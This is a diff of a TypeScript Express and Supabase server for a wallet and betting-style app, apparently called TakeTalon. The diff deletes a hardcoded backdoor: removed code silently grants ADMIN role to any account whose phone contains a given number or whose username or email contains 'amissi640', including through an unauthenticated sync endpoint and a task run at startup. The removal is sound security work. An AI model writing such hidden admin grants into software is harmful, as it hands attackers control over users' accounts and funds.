@@ -2908,98 +2908,6 @@ app.post("/api/supabase/request-unlock", async (req, res) => {
   }
 });
 
-let hasSyncedAgentRole68769887 = false;
-let isSyncingAgentRole68769887 = false;
-
-async function ensureAgentRoleFor68769887() {
-  if (!supabaseAdmin || hasSyncedAgentRole68769887 || isSyncingAgentRole68769887) return;
-  isSyncingAgentRole68769887 = true;
-  try {
-    // 1. Fast read first to see if any accounts exist and if they already have ADMIN role
-    const { data: matchedProfiles } = await withOpTimeout(
-      supabaseAdmin
-        .from("profiles")
-        .select("id, username, phone, role, is_verified")
-        .or("phone.ilike.%68769887%,phone.eq.68769887,phone.eq.+25768769887,phone.eq.25768769887")
-        .limit(5),
-      3500,
-      "lookup agent 68769887"
-    ).catch(() => ({ data: null }));
-
-    if (matchedProfiles && matchedProfiles.length > 0) {
-      const needsUpdate = matchedProfiles.filter((p: any) => p.role !== "ADMIN" || !p.is_verified);
-      if (needsUpdate.length === 0) {
-        hasSyncedAgentRole68769887 = true;
-        return;
-      }
-      // 2. Update specifically by ID rather than full-table scan with OR/ILIKE
-      for (const p of needsUpdate) {
-        await withOpTimeout(
-          supabaseAdmin.from("profiles").update({ role: "ADMIN", is_verified: true }).eq("id", p.id),
-          3500,
-          "update agent 68769887 by id"
-        ).catch(() => {});
-      }
-      hasSyncedAgentRole68769887 = true;
-      console.log("[SERVER] Successfully set ADMIN role for account 68769887 in DB");
-    }
-  } catch (err: any) {
-    console.log("[SERVER] Background sync notice (68769887):", err?.message || "timeout");
-  } finally {
-    isSyncingAgentRole68769887 = false;
-  }
-}
-
-let hasSyncedAdminRoleAmissi640 = false;
-let isSyncingAdminRoleAmissi640 = false;
-
-async function ensureAdminRoleForAmissi640() {
-  if (!supabaseAdmin || hasSyncedAdminRoleAmissi640 || isSyncingAdminRoleAmissi640) return;
-  isSyncingAdminRoleAmissi640 = true;
-  try {
-    // 1. Fast read first to see if account exists and if already ADMIN
-    const { data: matchedProfiles } = await withOpTimeout(
-      supabaseAdmin
-        .from("profiles")
-        .select("id, username, email, role, is_verified")
-        .or("username.ilike.%amissi640%,email.ilike.%amissi640%")
-        .limit(5),
-      3500,
-      "lookup admin amissi640"
-    ).catch(() => ({ data: null }));
-
-    if (matchedProfiles && matchedProfiles.length > 0) {
-      const needsUpdate = matchedProfiles.filter((p: any) => p.role !== "ADMIN" || !p.is_verified);
-      if (needsUpdate.length === 0) {
-        hasSyncedAdminRoleAmissi640 = true;
-        return;
-      }
-      // 2. Update specifically by ID
-      for (const p of needsUpdate) {
-        await withOpTimeout(
-          supabaseAdmin.from("profiles").update({ role: "ADMIN", is_verified: true }).eq("id", p.id),
-          3500,
-          "update admin amissi640 by id"
-        ).catch(() => {});
-      }
-      hasSyncedAdminRoleAmissi640 = true;
-      console.log("[SERVER] Successfully set ADMIN role for amissi640 in DB");
-    }
-  } catch (err: any) {
-    console.log("[SERVER] Background sync notice (amissi640):", err?.message || "timeout");
-  } finally {
-    isSyncingAdminRoleAmissi640 = false;
-  }
-}
-
-app.get("/api/agent/sync-role", async (req, res) => {
-  hasSyncedAgentRole68769887 = false;
-  hasSyncedAdminRoleAmissi640 = false;
-  await ensureAgentRoleFor68769887();
-  await ensureAdminRoleForAmissi640();
-  res.json({ status: "ok", message: "Synced AGENT/ADMIN roles" });
-});
-
 // ─────────────────────────────────────────────────────────────────────────────
 // OTP & Authentication Endpoints
 // ─────────────────────────────────────────────────────────────────────────────
@@ -4058,10 +3966,7 @@ const handleCreateAccountRoute = async (req: Request, res: Response) => {
           phone: cleanPhone,
           gender: cleanGender || null,
           birthday: birthday || null,
-          role:
-            cleanPhone.includes("68769887") || finalUsername.toLowerCase().includes("amissi640")
-              ? "ADMIN"
-              : "USER",
+          role: "USER",
           is_verified: true,
           is_pro: false,
           otp_verified: true,
@@ -4317,10 +4222,7 @@ app.post("/api/auth/login", async (req, res) => {
                 auth_user_id: authenticatedUser.id,
                 email: authEmail,
                 username: newUsername,
-                role:
-                  authEmail.includes("68769887") || newUsername.toLowerCase().includes("amissi640")
-                    ? "ADMIN"
-                    : "USER",
+                role: "USER",
                 is_verified: true,
                 otp_verified: true,
                 updated_at: new Date().toISOString(),
@@ -4343,15 +4245,6 @@ app.post("/api/auth/login", async (req, res) => {
       profile.auth_user_id = authenticatedUser.id;
     }
 
-    if (
-      profile &&
-      ((profile.phone && (profile.phone.includes("68769887") || profile.phone === "68769887")) ||
-        (profile.username && profile.username.toLowerCase().includes("amissi640")) ||
-        (profile.email && profile.email.toLowerCase().includes("amissi640")))
-    ) {
-      profile.role = "ADMIN";
-      profile.is_verified = true;
-    }
 
     let { data: walletData } = await withOpTimeout(
       supabaseAdmin
@@ -4459,23 +4352,6 @@ app.get("/api/auth/profile-lookup", async (req, res) => {
     }
 
     if (profileData) {
-      if (
-        profileData.phone &&
-        (profileData.phone.includes("68769887") || profileData.phone === "68769887")
-      ) {
-        profileData.role = "ADMIN";
-        profileData.is_verified = true;
-        ensureAgentRoleFor68769887().catch(() => {});
-      }
-      if (
-        (profileData.username && profileData.username.toLowerCase().includes("amissi640")) ||
-        (profileData.email && profileData.email.toLowerCase().includes("amissi640"))
-      ) {
-        profileData.role = "ADMIN";
-        profileData.is_verified = true;
-        ensureAdminRoleForAmissi640().catch(() => {});
-      }
-
       let { data: walletData } = await withOpTimeout(
         supabaseAdmin.from("wallets").select("*").eq("profile_id", profileData.id).maybeSingle(),
         3500,
@@ -4698,13 +4574,6 @@ async function startServer() {
     console.log(`[TakeTalon Server] Running on http://0.0.0.0:${PORT}`);
     console.log(`[SMS Forwarder Webhook] Active at http://0.0.0.0:${PORT}/api/sms-forwarder`);
     startAviatorRoundLoop();
-    setTimeout(() => {
-      ensureAgentRoleFor68769887()
-        .catch(() => {})
-        .finally(() => {
-          ensureAdminRoleForAmissi640().catch(() => {});
-        });
-    }, 1500);
   });
 }
 
